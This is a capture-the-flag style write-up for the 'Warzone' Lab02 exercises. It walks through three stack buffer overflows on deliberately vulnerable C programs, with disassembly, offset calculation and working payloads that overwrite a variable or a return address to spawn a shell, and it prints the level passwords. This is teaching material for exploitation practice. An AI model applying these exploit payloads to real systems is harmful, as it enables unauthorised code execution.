# Warzone Lab02: Stack Overflow

## Introduction

Stack buffer overflows allow you to overrun a buffer into other local variables, parameters or saved registers on the stack. In some cases, this can enable overwriting of important variables, such as one tracking a users privilege level. This lab explores a stack overrun into a local variable to escalate privileges, and two hijacks of control flow, all of which ultimately resulting in a shell.

## Lab02C

We are given the following C source code:

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2C.c -o lab2C
 */

void shell()
{
        printf("You did it.\n");
        system("/bin/sh");
}

int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        int set_me = 0;
        char buf[15];
        strcpy(buf, argv[1]);

        if(set_me == 0xdeadbeef)
        {
                shell();
        }
        else
        {
                printf("Not authenticated.\nset_me was %d\n", set_me);
        }

        return EXIT_SUCCESS;
}
```

In brief, this program allows us to pass a string on the commandline, which is subsequently read into a buffer of 15 characters. This program exhibits a classic buffer overflow where `strcpy` makes an unbounded copy. In this way we can access the memory of `set_me` to call `shell()`.

To satisfy `set_me == 0xdeadbeef` we first fill the buffer with 15 A's and then write the required bytes. Ensuring we use little endian, our payload can be constructed with a simple Python script as follows:

`./lab2C "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*15 + b"\xef\xbe\xad\xde")')"`

And we get our password: `lab2B:1m_all_ab0ut_d4t_b33f`

## Lab02B

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2B.c -o lab2B
 */

char* exec_string = "/bin/sh";

void shell(char* cmd)
{
        system(cmd);
}

void print_name(char* input)
{
        char buf[15];
        strcpy(buf, input);
        printf("Hello %s\n", buf);
}

int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        print_name(argv[1]);

        return EXIT_SUCCESS;
}
```

Our next program has the same vulnerability however we can't authenticate ourselves simply by overwriting a local stack variable. Instead we need to somehow call `shell()` while also passing `bin/sh` as a parameter.

First, let's get the address of `shell()` and make sure we can divert control flow to it. We'll do this by overwriting the saved return address on the stack that would be left by `main()` when calling `print_name()`.

```console
lab2B@warzone:/levels/lab02$ gdb ./lab2B
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080486bd <+0>:     push   ebp
   0x080486be <+1>:     mov    ebp,esp
   0x080486c0 <+3>:     sub    esp,0x18
   0x080486c3 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486c6 <+9>:     mov    DWORD PTR [esp],eax
   0x080486c9 <+12>:    call   0x8048590 <system@plt>
   0x080486ce <+17>:    leave
   0x080486cf <+18>:    ret
End of assembler dump.
```

Recall, there's no ASLR in these early labs so we know we need to jump to `0x080486bd`. With `gdb` we can figure out how much of the stack we need to overrun before we hit the return address, indicated by a Segmentation Fault after the function returns.

```
gdb-peda$ run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
Starting program: /levels/lab02/lab2B AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII

Program received signal SIGSEGV, Segmentation fault.
Invalid $PC address: 0x48484847 # GHHH
```
It looks like 27 bytes is doing the trick. We can confirm this by analyzing the assembly of `print_name()` with `gdb`.

```
gdb-peda$ disas print_name
Dump of assembler code for function print_name:
   0x080486d0 <+0>:     push   ebp
   0x080486d1 <+1>:     mov    ebp,esp
   0x080486d3 <+3>:     sub    esp,0x28
   0x080486d6 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486d9 <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x080486dd <+13>:    lea    eax,[ebp-0x17]
   0x080486e0 <+16>:    mov    DWORD PTR [esp],eax
   0x080486e3 <+19>:    call   0x8048580 <strcpy@plt>
   0x080486e8 <+24>:    lea    eax,[ebp-0x17]
   0x080486eb <+27>:    mov    DWORD PTR [esp+0x4],eax
   0x080486ef <+31>:    mov    DWORD PTR [esp],0x80487d8
   0x080486f6 <+38>:    call   0x8048570 <printf@plt>
   0x080486fb <+43>:    leave
   0x080486fc <+44>:    ret
End of assembler dump.
```

`print_name <+13>` references our `buf` in order to setup `strcpy` by moving it to the top of the stack. If we want to access the return address we must move past ebp too, so 0x17 + 0x4 (size of ebp) = 27 bytes before we start overwriting our return address.

Now we know the shape of our buffer should be something like

```
AAAABBBBCCCCDDDDEEEEFFFFGGG\xbd\x86\x04\x08
```

Which gets the following output; Success! It looks like we're calling system but our parameter is some garbage memory '4:'.

```
lab2B@warzone:/levels/lab02$ ./lab2B $(python -c 'print("X"*27 + "\xbd\x86\x04\x08")')
Hello XXXXXXXXXXXXXXXXXXXXXXXXXXX▒▒
sh: 1: 4: not found
Segmentation fault (core dumped)
```

Now lets setup our parameter to be `/bin/sh`, starting by disassembling `shell()`.

```
.
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080486bd <+0>:     push   ebp
   0x080486be <+1>:     mov    ebp,esp
   0x080486c0 <+3>:     sub    esp,0x18
   0x080486c3 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486c6 <+9>:     mov    DWORD PTR [esp],eax
   0x080486c9 <+12>:    call   0x8048590 <system@plt>
   0x080486ce <+17>:    leave
   0x080486cf <+18>:    ret
End of assembler dump.
```

It looks like our parameter for system needs to be at `ebp+0x8` before we call `shell`, such that `shell <+6>` can copy it ready for the `system` call. So lets get a pointer to `/bin/sh` and put it at `ebp+0x8`.

Helpfully, the string already exists as a global variable, so we should be able to simply reference that if we can find its address.

```
gdb-peda$ p &exec_string
$1 = (<data variable, no debug info> *) 0x804a028 <exec_string>
gdb-peda$ x/wx &exec_string
0x804a028 <exec_string>:        0x080487d0
```

This gives us our final payload:

```
./lab2B $(python -c 'print("AAAABBBBCCCCDDDDEEEEFFFFGGG\xbd\x86\x04\x08XXXX\xd0\x87\x04\x08")')
```

We require the 4 padding X's before the parameters address as `ebp+8`

And we get our password: `lab2A:i_c4ll_wh4t_i_w4nt_n00b`

## Lab02A

```C
void shell()
{
        printf("You got it\n");
        system("/bin/sh");
}

void concatenate_first_chars()
{
        struct {
                char word_buf[12];
                int i;
                char* cat_pointer;
                char cat_buf[10];
        } locals;
        locals.cat_pointer = locals.cat_buf;

        printf("Input 10 words:\n");
        for(locals.i=0; locals.i!=10; locals.i++)
        {
                // Read from stdin
                if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
                {
                        printf("Failed to read word\n");
                        return;
                }
                // Copy first char from word to next location in concatenated buffer
                *locals.cat_pointer = *locals.word_buf;
                locals.cat_pointer++;
        }

        // Even if something goes wrong, there's a null byte here
        //   preventing buffer overflows
        locals.cat_buf[10] = '\0';
        printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}

int main(int argc, char** argv)
{
        if(argc != 1)
        {
                printf("usage:\n%s\n", argv[0]);
                return EXIT_FAILURE;
        }

        concatenate_first_chars();

        printf("Not authenticated\n");
        return EXIT_SUCCESS;
}
```

Using gdb we can find `shell()` is at 0x080486fd.

We find we can overwrite `i` since `fgets` has the wrong max length (`0x10` vs `10`). Using this, we can force the loop to iterate more than ten times, which will subsequently overflow `cat_buf`, eventually hitting the return address.

Let's construct our payload, knowing we have a few required steps:
1. Overflow `i` such that it's greater than 10
2. Put a different character on each line

We can do this with the following short script:

```python
print('X'*16) # Overflow into i

for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
    print(c)
```

Running `./lab2A` with gdb and piping this script in as input, we see that EIP is overwritten to `0x5a595857` -> `ZYXW`. Looks like the very end of our input hit the return address. Nice one!

Now we can update our script to insert the address of `shell()` where `WXYZ` were:

```python
print('X'*16)

for c in 'ABCDEFGHIJKLMNOPQRSTUV':
    print(c)

# Now insert the return address
address = '\x08\x04\x86\xfd'[::-1] # Remember to use little endian

for c in address:
    print(c)
print('')
```

This gives us a slightly frustrating result:

```console
lab2A@warzone:/levels/lab02$ cat /tmp/out.txt | ./lab2A
Input 10 words:
Failed to read word
You got it
Segmentation fault (core dumped)
```

We seem to be dropping into a shell and then exiting. This is happening because our STDIN is dying, so we can fix this by adding another `cat` command after sending our payload. Our final command becomes:

`(cat /tmp/out.txt; cat) | ./lab2A`

`lab2end:D1d_y0u_enj0y_y0ur_cats?`